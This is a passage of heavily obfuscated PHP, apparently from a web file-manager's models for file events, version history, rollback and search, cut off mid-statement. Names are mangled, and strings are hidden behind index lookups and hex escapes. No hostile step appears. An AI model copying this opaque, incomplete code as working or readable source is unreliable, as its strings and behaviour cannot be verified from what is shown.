$åù‰±¶ë[$°Ì”€ÉÈ[595]] : $°Ì”€ÉÈ[12]); $this->addEvent($ÍÀÒş´, $°Ì”€ÉÈ[636], $ºˆ« œ); $Ïå™õ¼² = $ˆ—ëÏšı->sourceInfo($ÍÀÒş´); $ºˆ« œ = array($°Ì”€ÉÈ[194] => $Ïå™õ¼²[$°Ì”€ÉÈ[194]], $°Ì”€ÉÈ[32] => $Ïå™õ¼²[$°Ì”€ÉÈ[32]]); $this->addEvent($Šˆıñ¨, $°Ì”€ÉÈ[2226], $ºˆ« œ); } public function eventCopy($€²Ğ¸ï) { $this->eventCreate($€²Ğ¸ï, $_SERVER[äô®•½Â][634]); } public function eventRename($ïó½³¹, $Å¿°±¾, $ïÏ§Ş÷•) { $ë¬óŠì® =& $_SERVER[äô®•½Â]; $™ôœ„ = array($ë¬óŠì®[1237] => $Å¿°±¾, $ë¬óŠì®[1238] => $ïÏ§Ş÷•); return $this->addEvent($ïó½³¹, $ë¬óŠì®[1440], $™ôœ„); } public function eventAddComment($Çæˆ¾€¦, $ƒÈÒÙÙ„) { return $this->addEvent($Çæˆ¾€¦, $_SERVER[äô®•½Â][2227], $ƒÈÒÙÙ„); } public function eventAddDesc($¸£•Š·®, $Æ¹ş©Ô ) { return $this->addEvent($¸£•Š·®, $_SERVER[äô®•½Â][2228], $Æ¹ş©Ô ); } public function listBySource($ş˜öğ‰©) { $åæ¼Ëàù =& $_SERVER[äô®•½Â]; $»·«˜†¼ = Model($åæ¼Ëàù[1426])->sourceInfo($ş˜öğ‰©); $†àïÒ„ò = array($åæ¼Ëàù[502] => $ş˜öğ‰©); if ($»·«˜†¼[$åæ¼Ëàù[496]] == $åæ¼Ëàù[91]) { $éş¹ñ˜ = Model($åæ¼Ëàù[1426])->listSearchChildren($ş˜öğ‰©, 20000); $éş¹ñ˜[] = $ş˜öğ‰© . $åæ¼Ëàù[465]; $†àïÒ„ò = array($åæ¼Ëàù[194] => array($åæ¼Ëàù[7], $éş¹ñ˜)); } $Ìà´ÆêÅ = $this->where($†àïÒ„ò)->order($åæ¼Ëàù[2229])->selectPage(); if ($Ìà´ÆêÅ[$åæ¼Ëàù[453]][$åæ¼Ëàù[454]] == 0) { $Ìà´ÆêÅ[$åæ¼Ëàù[453]][$åæ¼Ëàù[454]] = 1; $Ìà´ÆêÅ[$åæ¼Ëàù[456]] = array(array($åæ¼Ëàù[502] => $ş˜öğ‰©, $åæ¼Ëàù[2209] => $»·«˜†¼[$åæ¼Ëàù[193]], $åæ¼Ëàù[1768] => $»·«˜†¼[$åæ¼Ëàù[538]], $åæ¼Ëàù[507] => $åæ¼Ëàù[2230], $åæ¼Ëàù[508] => $»·«˜†¼[$åæ¼Ëàù[234]], $åæ¼Ëàù[1770] => $åæ¼Ëàù[12])); } return $this->eventListParse($Ìà´ÆêÅ, $ş˜öğ‰©); } private function eventListParse($öÊâß¶, $ïçÊÏíê) { $‘Œ›¸úÌ =& $_SERVER[äô®•½Â]; $ôıúªÈ» = $öÊâß¶[$‘Œ›¸úÌ[456]]; $‚¥òÑ˜Í = array_to_keyvalue($ôıúªÈ», $‘Œ›¸úÌ[12], $‘Œ›¸úÌ[194]); $Ñ³‡¥Ñö = array_to_keyvalue($ôıúªÈ», $‘Œ›¸úÌ[12], $‘Œ›¸úÌ[2215]); foreach ($ôıúªÈ» as $Á²ì¿†¶) { $ıİ‰áéı = $Á²ì¿†¶[$‘Œ›¸úÌ[537]]; if ($Á²ì¿†¶[$‘Œ›¸úÌ[33]] == $‘Œ›¸úÌ[636] && isset($ıİ‰áéı[$‘Œ›¸úÌ[1237]])) { $‚¥òÑ˜Í[] = $ıİ‰áéı[$‘Œ›¸úÌ[1237]] . $‘Œ›¸úÌ[12]; $‚¥òÑ˜Í[] = $ıİ‰áéı[$‘Œ›¸úÌ[1238]] . $‘Œ›¸úÌ[12]; } if ($Á²ì¿†¶[$‘Œ›¸úÌ[33]] == $‘Œ›¸úÌ[2226] && isset($ıİ‰áéı[$‘Œ›¸úÌ[194]])) { $‚¥òÑ˜Í[] = $ıİ‰áéı[$‘Œ›¸úÌ[194]] . $‘Œ›¸úÌ[12]; } } $‚¥òÑ˜Í = array_merge($‚¥òÑ˜Í, $Ñ³‡¥Ñö, array($ïçÊÏíê . $‘Œ›¸úÌ[12])); $‚¥òÑ˜Í = array_unique($‚¥òÑ˜Í); $—âïÂ£Ê = array_unique(array_to_keyvalue($ôıúªÈ», $‘Œ›¸úÌ[12], $‘Œ›¸úÌ[1777])); $ÕÖ•ïé = Model($‘Œ›¸úÌ[610])->userListInfo($—âïÂ£Ê); $şİ§¸÷¬ = Model($‘Œ›¸úÌ[896])->sourceListInfo($‚¥òÑ˜Í, !0); foreach ($ôıúªÈ» as &$Á²ì¿†¶) { if ($Á²ì¿†¶[$‘Œ›¸úÌ[33]] == $‘Œ›¸úÌ[636] && isset($Á²ì¿†¶[$‘Œ›¸úÌ[537]][$‘Œ›¸úÌ[1237]])) { $Á²ì¿†¶[$‘Œ›¸úÌ[537]][$‘Œ›¸úÌ[1237]] = $şİ§¸÷¬[$Á²ì¿†¶[$‘Œ›¸úÌ[537]][$‘Œ›¸úÌ[1237]]]; $Á²ì¿†¶[$‘Œ›¸úÌ[537]][$‘Œ›¸úÌ[1238]] = $şİ§¸÷¬[$Á²ì¿†¶[$‘Œ›¸úÌ[537]][$‘Œ›¸úÌ[1238]]]; } if ($Á²ì¿†¶[$‘Œ›¸úÌ[33]] == $‘Œ›¸úÌ[2226] && isset($Á²ì¿†¶[$‘Œ›¸úÌ[537]][$‘Œ›¸úÌ[194]])) { $Á²ì¿†¶[$‘Œ›¸úÌ[537]][$‘Œ›¸úÌ[194]] = $şİ§¸÷¬[$Á²ì¿†¶[$‘Œ›¸úÌ[537]][$‘Œ›¸úÌ[194]]]; } $Á²ì¿†¶[$‘Œ›¸úÌ[90]] = $şİ§¸÷¬[$Á²ì¿†¶[$‘Œ›¸úÌ[194]]]; $Á²ì¿†¶[$‘Œ›¸úÌ[2231]] = $şİ§¸÷¬[$Á²ì¿†¶[$‘Œ›¸úÌ[2215]]]; if ($Á²ì¿†¶[$‘Œ›¸úÌ[33]] == $‘Œ›¸úÌ[1225]) { $Á²ì¿†¶[$‘Œ›¸úÌ[2231]] = $Á²ì¿†¶[$‘Œ›¸úÌ[90]]; $Á²ì¿†¶[$‘Œ›¸úÌ[2215]] = $Á²ì¿†¶[$‘Œ›¸úÌ[2231]][$‘Œ›¸úÌ[194]]; $Á²ì¿†¶[$‘Œ›¸úÌ[90]] = !1; $Á²ì¿†¶[$‘Œ›¸úÌ[194]] = $‘Œ›¸úÌ[12]; } $Á²ì¿†¶[$‘Œ›¸úÌ[2160]] = $ÕÖ•ïé[$Á²ì¿†¶[$‘Œ›¸úÌ[1777]]]; } unset($Á²ì¿†¶); $öÊâß¶[$‘Œ›¸úÌ[456]] = $ôıúªÈ»; return $öÊâß¶; } public function removeBySource($í¬Î¿óš) { $üÍƒ‘§ç = array($_SERVER[äô®•½Â][502] => $í¬Î¿óš); $this->where($üÍƒ‘§ç)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\x72\x63\x65\137\150\x69\163\164\157\x72\x79"; public function historyCount($ç­½½’Î) { $ê€¶ãî• =& $_SERVER[äô®•½Â]; if (!$ç­½½’Î) { return array(); } if (is_string($ç­½½’Î) || is_int($ç­½½’Î)) { $ç­½½’Î = array($ç­½½’Î); } $Œ—¼¦¦¬ = array($ê€¶ãî•[194], $ê€¶ãî•[2232] => $ê€¶ãî•[578]); $¦êòÍ· = array($ê€¶ãî•[194] => array($ê€¶ãî•[7], $ç­½½’Î)); $ìë‡‘ÈÈ = $this->field($Œ—¼¦¦¬)->where($¦êòÍ·)->group($ê€¶ãî•[194])->select(); return array_to_keyvalue($ìë‡‘ÈÈ, $ê€¶ãî•[194], $ê€¶ãî•[578]); } public function addHistory($´Í²éøµ, $óüçÄ°ß = '') { $›ÁØƒáı =& $_SERVER[äô®•½Â]; $È­©ò® = array($›ÁØƒáı[502] => $´Í²éøµ[$›ÁØƒáı[194]], $›ÁØƒáı[1768] => isset($´Í²éøµ[$›ÁØƒáı[540]]) ? $´Í²éøµ[$›ÁØƒáı[540]] : $´Í²éøµ[$›ÁØƒáı[538]], $›ÁØƒáı[555] => $´Í²éøµ[$›ÁØƒáı[554]], $›ÁØƒáı[633] => $´Í²éøµ[$›ÁØƒáı[79]], $›ÁØƒáı[2233] => $óüçÄ°ß); if ($GLOBALS[$›ÁØƒáı[6]][$›ÁØƒáı[92]][$›ÁØƒáı[1300]] >= 1) { $this->historyAutoClear($È­©ò®[$›ÁØƒáı[194]]); $this->add($È­©ò®); } Hook::trigger($›ÁØƒáı[2234], $È­©ò®); Model($›ÁØƒáı[2235])->eventFileEdit($´Í²éøµ[$›ÁØƒáı[194]]); } private function historyAutoClear($ãç«î³ä) { $œÀ³óÊæ =& $_SERVER[äô®•½Â]; $ØˆºŸ÷¼ = Model($œÀ³óÊæ[836])->get($œÀ³óÊæ[1322]); $è²ØıªÜ = intval($GLOBALS[$œÀ³óÊæ[6]][$œÀ³óÊæ[92]][$œÀ³óÊæ[1300]]); $ŞüÆû´Å = $ØˆºŸ÷¼ == $œÀ³óÊæ[1323] ? min(5, $è²ØıªÜ) : $è²ØıªÜ; $ŞüÆû´Å = $ŞüÆû´Å <= 0 ? 0 : $ŞüÆû´Å - 1; if ($ŞüÆû´Å >= 499) { return; } $™¦Ö§ç„ = array($œÀ³óÊæ[502] => $ãç«î³ä); $õˆÑ´‹Ğ = $this->field($œÀ³óÊæ[2236])->where($™¦Ö§ç„)->order($œÀ³óÊæ[2229])->select(); if (!$õˆÑ´‹Ğ || $ŞüÆû´Å >= count($õˆÑ´‹Ğ)) { return; } $±¡øàá¯ = array_to_keyvalue($õˆÑ´‹Ğ, $œÀ³óÊæ[12], $œÀ³óÊæ[486]); $±¡øàá¯ = array_slice($±¡øàá¯, $ŞüÆû´Å); $Ø›¾é¾õ = array_to_keyvalue($õˆÑ´‹Ğ, $œÀ³óÊæ[12], $œÀ³óÊæ[554]); $Ø›¾é¾õ = array_slice($Ø›¾é¾õ, $ŞüÆû´Å); if (!$±¡øàá¯ || !$Ø›¾é¾õ) { return; } $™¦Ö§ç„ = array($œÀ³óÊæ[504] => array($œÀ³óÊæ[7], $±¡øàá¯)); $this->where($™¦Ö§ç„)->delete(); Model($œÀ³óÊæ[557])->remove($Ø›¾é¾õ); } public function listData($±ŠÅİÇ) { $—‰åé‡¾ =& $_SERVER[äô®•½Â]; $€úñêÁ¨ = array($—‰åé‡¾[502] => $±ŠÅİÇ); $“ááÇËö = $—‰åé‡¾[2237]; $æš¤‡· = $this->field($“ááÇËö)->where($€úñêÁ¨)->order($—‰åé‡¾[2229])->selectPage(); $this->_listAppendUser($æš¤‡·[$—‰åé‡¾[456]]); $ ¨ü¥À = Model($—‰åé‡¾[836])->get($—‰åé‡¾[1322]); $ê¹àæÃÂ = 5; if ($ ¨ü¥À == $—‰åé‡¾[1323]) { $æš¤‡·[$—‰åé‡¾[456]] = array_slice($æš¤‡·[$—‰åé‡¾[456]], 0, $ê¹àæÃÂ); $æš¤‡·[$—‰åé‡¾[453]] = array($—‰åé‡¾[2238] => 1, $—‰åé‡¾[2239] => 20, $—‰åé‡¾[2240] => 1, $—‰åé‡¾[2241] => count($æš¤‡·[$—‰åé‡¾[456]])); } return $æš¤‡·; } protected function _listAppendUser(&$““…Ç) { $ûô•İ¤õ =& $_SERVER[äô®•½Â]; $¸è”Òƒ = array_to_keyvalue($““…Ç, $ûô•İ¤õ[12], $ûô•İ¤õ[1777]); $ê¥ø¾ºì = Model($ûô•İ¤õ[610])->userListInfo($¸è”Òƒ); foreach ($““…Ç as &$ã”®½£) { $¡ÃŸßØ™ = $ã”®½£[$ûô•İ¤õ[1777]]; $ã”®½£[$ûô•İ¤õ[538]] = $ê¥ø¾ºì[$¡ÃŸßØ™] ? $ê¥ø¾ºì[$¡ÃŸßØ™] : !1; } unset($ã”®½£); } public function fileInfo($Ê¨È¾üö, $§¬š˜ = false) { $æ˜·Ğèğ =& $_SERVER[äô®•½Â]; $Ç†æÜµ‹ = $this->tablePrefix; $è‘°Èå¦ = "{$Ç†æÜµ‹}\151\x6f\x5f\146\151\154\x65\40\146\151\154\x65\x73\40\x6f\x6e\x20\146\151\154\145\163\x2e\146\x69\154\145\x49\x44\x20\75\40\x68\x69\163\x74\x6f\x72\171\56\x66\x69\x6c\145\111\x44"; $çõç•òƒ = $this->alias($æ˜·Ğèğ[2242])->where(array($æ˜·Ğèğ[504] => $Ê¨È¾üö))->join($è‘°Èå¦, $æ˜·Ğèğ[2243])->find(); if ($çõç•òƒ && $§¬š˜) { $¤°¾Úµı = array($æ˜·Ğèğ[194] => $çõç•òƒ[$æ˜·Ğèğ[194]], $æ˜·Ğèğ[486] => array($æ˜·Ğèğ[1085], $Ê¨È¾üö)); $çõç•òƒ[$æ˜·Ğèğ[1663]] = $this->where($¤°¾Úµı)->count(); } return $çõç•òƒ; } public function removeItem($Œ  Ùº¶) { $¹ƒ”× » =& $_SERVER[äô®•½Â]; $Ğ½–©Ãß = array($¹ƒ”× »[504] => $Œ  Ùº¶); $µÁ‘ ñº = $this->where($Ğ½–©Ãß)->find(); if ($µÁ‘ ñº) { $‡ê”‡É— = $this->where($Ğ½–©Ãß)->delete(); Model($¹ƒ”× »[557])->remove($µÁ‘ ñº[$¹ƒ”× »[554]]); return $‡ê”‡É—; } return !1; } public function removeBySource($—ƒô³õ) { $åôš¯“ =& $_SERVER[äô®•½Â]; if (!$—ƒô³õ) { return !1; } if (!is_array($—ƒô³õ)) { $—ƒô³õ = array($—ƒô³õ); } $“£ÔÁ­… = array($åôš¯“[502] => array($åôš¯“[7], $—ƒô³õ)); $êŸØªÍ± = $this->field($åôš¯“[555])->where($“£ÔÁ­…)->select(); if ($êŸØªÍ±) { $this->where($“£ÔÁ­…)->delete(); $ÀáéÁ€í = array_to_keyvalue($êŸØªÍ±, $åôš¯“[12], $åôš¯“[554]); Model($åôš¯“[557])->remove($ÀáéÁ€í); } return !0; } public function setDetail($‹©ò‹‘„, $¥Àœß¨˜) { $“Ø¥¡–Æ =& $_SERVER[äô®•½Â]; return $this->where(array($“Ø¥¡–Æ[504] => $‹©ò‹‘„))->save(array($“Ø¥¡–Æ[2233] => $¥Àœß¨˜)); } public function rollbackToItem($”ª™¯¬î, $ò‰”ø¿ò) { $ü×İ¸¢± =& $_SERVER[äô®•½Â]; $ÅâŒŞÉÙ = Model($ü×İ¸¢±[896])->sourceInfo($”ª™¯¬î); $this->addHistory($ÅâŒŞÉÙ, LNG($ü×İ¸¢±[2244])); $×¸­ëïŠ = $this->find($ò‰”ø¿ò); $æé¸÷© = array($ü×İ¸¢±[554] => $×¸­ëïŠ[$ü×İ¸¢±[554]], $ü×İ¸¢±[79] => $×¸­ëïŠ[$ü×İ¸¢±[79]], $ü×İ¸¢±[88] => time(), $ü×İ¸¢±[540] => USER_ID); Model($ü×İ¸¢±[896])->where(array($ü×İ¸¢±[194] => $”ª™¯¬î))->save($æé¸÷©); return $this->where(array($ü×İ¸¢±[504] => $ò‰”ø¿ò))->delete(); } public function clearSame($¦ò¶ŸØ) { $½ß¬‰ŸØ =& $_SERVER[äô®•½Â]; $ííšõú² = $this->listData($¦ò¶ŸØ); $ÕÜü¥ÏÃ = array_to_keyvalue_group($ííšõú², $½ß¬‰ŸØ[554]); $»Å¼ÄîÈ = array(); $ĞèŠû° = array(); foreach ($ÕÜü¥ÏÃ as $¿ßã£…å) { if (!$¿ßã£…å || count($¿ßã£…å) <= 1) { continue; } foreach ($¿ßã£…å as $İ³”ûØ) { $»Å¼ÄîÈ[] = $İ³”ûØ[$½ß¬‰ŸØ[554]]; $ĞèŠû°[] = $İ³”ûØ[$½ß¬‰ŸØ[486]]; } } if (!$ĞèŠû°) { return; } $this->where(array($½ß¬‰ŸØ[486] => array($½ß¬‰ŸØ[7], $ĞèŠû°)))->delete(); Model($½ß¬‰ŸØ[557])->remove($»Å¼ÄîÈ); } public function userSpace() { $ĞÁàù =& $_SERVER[äô®•½Â]; $‹ìßáú¡ = $this->tablePrefix; $õÁÓÍ€º = array($ĞÁàù[1768] => USER_ID); $ıÄÈ¸  = "{$‹ìßáú¡}\151\x6f\137\x66\x69\154\145\x20\x66\x69\154\145\x73\x20\x6f\x6e\x20\146\x69\154\x65\163\x2e\146\151\x6c\145\111\104\x20\x3d\x20\150\151\x73\x74\x6f\x72\171\x2e\x66\x69\154\145\x49\x44"; return $this->alias($ĞÁàù[2242])->where($õÁÓÍ€º)->join($ıÄÈ¸ , $ĞÁàù[2243])->sum($ĞÁàù[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ò«¾÷ìú) { $æˆ·šº¬ =& $_SERVER[äô®•½Â]; $Ğ…€³·˜ = KodIO::fileTypeList(); $ÈÚ¥îŸ¶ = $Ğ…€³·˜[$ò«¾÷ìú]; if (!$ÈÚ¥îŸ¶) { return array(); } $Ş›°ßğÊ = $ÈÚ¥îŸ¶[$æˆ·šº¬[169]]; $àšÛäê = $æˆ·šº¬[7]; if (!$ÈÚ¥îŸ¶[$æˆ·šº¬[169]]) { $×ÉÆûô¯ = array_to_keyvalue($Ğ…€³·˜, $æˆ·šº¬[12], $æˆ·šº¬[169]); $Ş›°ßğÊ = implode($æˆ·šº¬[50], $×ÉÆûô¯); $àšÛäê = $æˆ·šº¬[2245]; } $´ñ„¸Í = explode($æˆ·šº¬[50], trim($Ş›°ßğÊ, $æˆ·šº¬[50])); return array($àšÛäê, $´ñ„¸Í); } public function listPathType($Ã¿¥º‘Ó) { $©í“åŒŞ =& $_SERVER[äô®•½Â]; $„Á„ŠâË = $this->fileTypeWhere($Ã¿¥º‘Ó); if (!$„Á„ŠâË) { return array(); } $Ô±µò›º = USER_ID; $’é½ÁÓ› = Model($©í“åŒŞ[610])->getInfo($Ô±µò›º); $ç«ü²¤† = array($©í“åŒŞ[664] => SourceModel::TYPE_USER, $©í“åŒŞ[597] => array($©í“åŒŞ[628], $©í“åŒŞ[606] . $’é½ÁÓ›[$©í“åŒŞ[90]][$©í“åŒŞ[194]] . $©í“åŒŞ[629]), $©í“åŒŞ[665] => $Ô±µò›º, $©í“åŒŞ[662] => 0, $©í“åŒŞ[663] => $„Á„ŠâË); return $this->listSource($ç«ü²¤†); } public function listSearch($èŸˆçœí, $Î†ŸŠå‡ = 300) { $¸ˆ÷…•ú =& $_SERVER[äô®•½Â]; if (isset($èŸˆçœí[$¸ˆ÷…•ú[2076]]) && $èŸˆçœí[$¸ˆ÷…•ú[2076]]) { $èŸˆçœí[$¸ˆ÷…•ú[2076]] = str_replace($¸ˆ÷…•ú[471], $¸ˆ÷…•ú[2246], trim($èŸˆçœí[$¸ˆ÷…•ú[2076]])); } $¨µÜõ¿ = $this->_parseSearchWhere($èŸˆçœí); if (!isset($¨µÜõ¿[$¸ˆ÷…•ú[516]])) { $¨µÜõ¿[$¸ˆ÷…•ú[516]] = 0; } $Àóí«ëİ = $¸ˆ÷…•ú[2247]; $İ“†Ú¼Õ = $¨µÜõ¿; $æºÄ¡á  = $Àóí«ëİ; $this->_listSearchBindPinyin($èŸˆçœí, $¨µÜõ¿, $Àóí«ëİ); $this->alias($¸ˆ÷…•ú[530])->_makeOrder(); $¨µÜõ¿ = $this->parseWhereLike($¨µÜõ¿); $ë™¢¶³ = $this->distinct(!0)->field($Àóí«ëİ)->where($¨µÜõ¿)->selectPage($Î†ŸŠå‡); if ($GLOBALS[$¸ˆ÷…•ú[6]][$¸ˆ÷…•ú[468]][$¸ˆ÷…•ú[469]] && Input::check($èŸˆçœí[$¸ˆ÷…•ú[2076]], $¸ˆ÷…•ú[671]) && $ë™¢¶³[$¸ˆ÷…•ú[453]][$¸ˆ÷…•ú[439]] == 1 && $ë™¢¶³[$¸ˆ÷…•ú[453]][$¸ˆ÷…•ú[454]] == 0) { $ë™¢¶³ = $this->distinct(!0)->field($Àóí«ëİ)->where($İ“†Ú¼Õ)->limit(1000)->select(); $ë™¢¶³ = array_page_split($ë™¢¶³, !1, $Î†ŸŠå‡); } $this->_listSearchFileContent($ë™¢¶³, $èŸˆçœí, $æºÄ¡á , $İ“†Ú¼Õ); $this->_listSearchDesc($ë™¢¶³, $èŸˆçœí, $æºÄ¡á ); $this->_listSearchTag($ë™¢¶³, $èŸˆçœí, $æºÄ¡á ); $this->_listSearchGroupTag($ë™¢¶³, $èŸˆçœí, $æºÄ¡á ); $this->_listDataApply($ë™¢¶³[$¸ˆ÷…•ú[456]]); $this->_listMake($ë™¢¶³); return $ë™¢¶³; } private function _listSearchFileContent(&$Ë•óå†£, $ÕíİÏ…ø, $°ëÌñ§Õ, $’£Èøä£) { $†Ü—«Íı =& $_SERVER[äô®•½Â]; if (!$ÕíİÏ…ø[$†Ü—«Íı[2076]] || $Ë•óå†£[$†Ü—«Íı[453]][$†Ü—«Íı[439]] > 1) { return; } if (!isset($’£Èøä£[$†Ü—«Íı[32]]) || !is_array($ÕíİÏ…ø[$†Ü—«Íı[554]])) { return; } $’£Èøä£[$†Ü—«Íı[554]] = array($†Ü—«Íı[7], $ÕíİÏ…ø[$†Ü—«Íı[554]]); unset($’£Èøä£[$†Ü—«Íı[32]]); unset($ÕíİÏ…ø[$†Ü—«Íı[554]]); $»£å‰À = $this->field($°ëÌñ§Õ)->where($’£Èøä£)->limit($†Ü—«Íı[2248])->select(); if (!$»£å‰À || count($»£å‰À) == 0) { return; } $Ë•óå†£[$†Ü—«Íı[456]] = array_merge($»£å‰À, $Ë•óå†£[$†Ü—«Íı[456]]); $Ë•óå†£[$†Ü—«Íı[453]][$†Ü—«Íı[454]] += count($»£å‰À); } private function _listSearchTag(&$˜èÛÛ²³, $üŞ¥©¶«, $õŠÏ‡£ß) { $ñİˆù¼ô =& $_SERVER[äô®•½Â]; if (empty($üŞ¥©¶«[$ñİˆù¼ô[1937]]) || !in_array($ñİˆù¼ô[2249], $üŞ¥©¶«[$ñİˆù¼ô[1937]])) { return; } if (!$üŞ¥©¶«[$ñİˆù¼ô[2076]] || $˜èÛÛ²³[$ñİˆù¼ô[453]][$ñİˆù¼ô[439]] > 1) { return; } $¥¦ª¿’ö = Model($ñİˆù¼ô[2250])->listData(); $¥¹›éø = array(); $çËºé² = $üŞ¥©¶«[$ñİˆù¼ô[2076]]; foreach ($¥¦ª¿’ö as $ù ³×ƒ) { $÷ô¨ıË¬ = $ù ³×ƒ[$ñİˆù¼ô[32]]; $ÊÑ¡ÆÎã = str_replace($ñİˆù¼ô[53], $ñİˆù¼ô[12], Pinyin::get($÷ô¨ıË¬)); if (stripos($÷ô¨ıË¬, $çËºé²) !== !1 || stripos($ÊÑ¡ÆÎã, $çËºé²) !== !1) { $¥¹›éø[] = $ù ³×ƒ[$ñİˆù¼ô[486]]; } } if (!$¥¹›éø) { return; } $ÎÅ¿×‚ = array($ñİˆù¼ô[511] => array($ñİˆù¼ô[7], $¥¹›éø), $ñİˆù¼ô[1777] => USER_ID); $ĞÛ„Ù¼¤ = Model($ñİˆù¼ô[513])->field($ñİˆù¼ô[87])->where($ÎÅ¿×‚)->select(); $ĞÛ„Ù¼¤ = array_to_keyvalue($ĞÛ„Ù¼¤, $ñİˆù¼ô[12], $ñİˆù¼ô[87]); $Ìüú‰°’ = array_unique($ĞÛ„Ù¼¤); $this->_listSearchMerge($˜èÛÛ²³, $üŞ¥©¶«, $õŠÏ‡£ß, $Ìüú‰°’); } private function _listSearchDesc(&$ªË³ŒÇ­, $ûØûî¬, $ÀÕ¸Û¨) { $ûÂ–’­ =& $_SERVER[äô®•½Â]; if (empty($ûØûî¬[$ûÂ–’­[1937]]) || !in_array($ûÂ–’­[537], $ûØûî¬[$ûÂ–’­[1937]])) { return; } if (!$ûØûî¬[$ûÂ–’­[2076]] || $ªË³ŒÇ­[$ûÂ–’­[453]][$ûÂ–’­[439]] > 1) { return; } $Íµñ… = array($ûÂ–’­[97] => $ûÂ–’­[537], $ûÂ–’­[461] => array($ûÂ–’­[470], $ûÂ–’­[2078] . $ûØûî¬[$ûÂ–’­[2076]] . $ûÂ–’­[2078])); $éİæÄ¶Œ = !1; if ($éİæÄ¶Œ) { $ºá©Å§ = $this->listSearchChildren($ûØûî¬[$ûÂ–’­[193]]); $ºá©Å§ = array_unique($ºá©Å§); if (!$ºá©Å§) { return; } $Íµñ…[$ûÂ–’­[194]] = array($ûÂ–’­[7], $ºá©Å§); } $ëï›øŞğ = Model($ûÂ–’­[648])->field($ûÂ–’­[194])->where($Íµñ…)->limit(5000)->select(); $ş«§äˆš = array_to_keyvalue($ëï›øŞğ, $ûÂ–’­[12], $ûÂ–’­[194]); $this->_listSearchMerge($ªË³ŒÇ­, $ûØûî¬, $ÀÕ¸Û¨, $ş«§äˆš); } private function _listSearchGroupTag(&$¹ƒÒı§, $ÉØŒÇŞÅ, $›ÁÕèïÅ) { $×ÇÔ²ˆ =& $_SERVER[äô®•½Â]; if (empty($ÉØŒÇŞÅ[$×ÇÔ²ˆ[1937]]) || !in_array($×ÇÔ²ˆ[2249], $ÉØŒÇŞÅ[$×ÇÔ²ˆ[1937]])) { return; } if (!$ÉØŒÇŞÅ[$×ÇÔ²ˆ[2076]] || $¹ƒÒı§[$×ÇÔ²ˆ[453]][$×ÇÔ²ˆ[439]] > 1 || !$ÉØŒÇŞÅ[$×ÇÔ²ˆ[193]]) { return; } $¿ü£ûÎ¨ = $this->sourceInfo($ÉØŒÇŞÅ[$×ÇÔ²ˆ[193]]); if (!$¿ü£ûÎ¨ || $¿ü£ûÎ¨[$×ÇÔ²ˆ[191]] != SourceModel::TYPE_GROUP) { return; } $¯´ƒ½Ö = $¿ü£ûÎ¨[$×ÇÔ²ˆ[582]]; $Äß¸¸¹ª = Model($×ÇÔ²ˆ[2251])->get($¯´ƒ½Ö); $¾‘×°¶ô = array(); $Âô‚äã¦ = $ÉØŒÇŞÅ[$×ÇÔ²ˆ[2076]]; foreach ($Äß¸¸¹ª[$×ÇÔ²ˆ[456]] as $Ø®Ì¬Ë¬) { $ºŞ‰Ÿ–À = $Ø®Ì¬Ë¬[$×ÇÔ²ˆ[32]]; $”ÇèÑôæ = str_replace($×ÇÔ²ˆ[53], $×ÇÔ²ˆ[12], Pinyin::get($ºŞ‰Ÿ–À)); if (stripos($ºŞ‰Ÿ–À, $Âô‚äã¦) !== !1 || stripos($”ÇèÑôæ, $Âô‚äã¦) !== !1) { $¾‘×°¶ô[] = $Ø®Ì¬Ë¬[$×ÇÔ²ˆ[486]]; } } if (!$¾‘×°¶ô) { return; } $ûâç°‘ = array($×ÇÔ²ˆ[511] => array($×ÇÔ²ˆ[7], $¾‘×°¶ô), $×ÇÔ²ˆ[1777] => 0, $×ÇÔ²ˆ[33] => $×ÇÔ²ˆ[1384] . $¯´ƒ½Ö); $‹ÅûşÖ‡ = Model($×ÇÔ²ˆ[513])->field($×ÇÔ²ˆ[87])->where($ûâç°‘)->select(); $‹ÅûşÖ‡ = array_to_keyvalue($‹ÅûşÖ‡, $×ÇÔ²ˆ[12], $×ÇÔ²ˆ[87]); $“ê€ÄÜì = array_unique($‹ÅûşÖ‡); $this->_listSearchMerge($¹ƒÒı§, $ÉØŒÇŞÅ, $›ÁÕèïÅ, $“ê€ÄÜì); } private function _listSearchMerge(&$çß¾Ö‚, $Ğ£¬ƒ‡ë, $Èæà£Ö, $è¡—õ•) { $Ì«•ã…Š =& $_SERVER[äô®•½Â]; if (!$è¡—õ•) { return; } $ö˜§¸–‘ = array_to_keyvalue($çß¾Ö‚[$Ì«•ã…Š[456]], $Ì«•ã…Š[12], $Ì«•ã…Š[194]); $ºôÁ¶¦° = array_diff($è¡—õ•, $ö˜§¸–‘); if (!$ºôÁ¶¦°) { return; } $‚ÌÖê¿’ = array($Ì«•ã…Š[194] => array($Ì«•ã…Š[7], $ºôÁ¶¦°)); $çé´­æ³ = $this->field($Èæà£Ö)->where($‚ÌÖê¿’)->select(); if (!$çé´­æ³) { return; } $‚§‘ÈÏ = array(); foreach ($çé´­æ³ as $šˆÈİÉÆ) { if ($this->_listSearchFilter($šˆÈİÉÆ, $Ğ£¬ƒ‡ë)) { $‚§‘ÈÏ[] = $šˆÈİÉÆ; } } $çß¾Ö‚[$Ì«•ã…Š[456]] = array_merge($‚§‘ÈÏ, $çß¾Ö‚[$Ì«•ã…Š[456]]); $çß¾Ö‚[$Ì«•ã…Š[453]][$Ì«•ã…Š[454]] += count($‚§‘ÈÏ); } private function _listSearchFilter($¤¤İ÷™å, $Ê›ïö»È) { $öÊÇõ² =& $_SERVER[äô®•½Â]; $•‚¢ ¹½ = $¤¤İ÷™å[$öÊÇõ²[496]] == $öÊÇõ²[91]; if (!strstr($¤¤İ÷™å[$öÊÇõ²[597]], $öÊÇõ²[50] . $Ê›ïö»È[$öÊÇõ²[193]] . $öÊÇõ²[50])) { return !1; } if (isset($Ê›ïö»È[$öÊÇõ²[497]]) && $Ê›ïö»È[$öÊÇõ²[497]] != $öÊÇõ²[842]) { if ($Ê›ïö»È[$öÊÇõ²[497]] == $öÊÇõ²[78] && !$•‚¢ ¹½) { return !1; } if ($Ê›ïö»È[$öÊÇõ²[497]] != $öÊÇõ²[78] && $•‚¢ ¹½) { return !1; } if (!strstr($¤¤İ÷™å[$öÊÇõ²[169]], $öÊÇõ²[50] . $Ê›ïö»È[$öÊÇõ²[497]] . $öÊÇõ²[50])) { return !1; } } if (isset($Ê›ïö»È[$öÊÇõ²[2252]]) && $Ê›ïö»È[$öÊÇõ²[2252]] < $¤¤İ÷™å[$öÊÇõ²[79]]) { return !1; } if 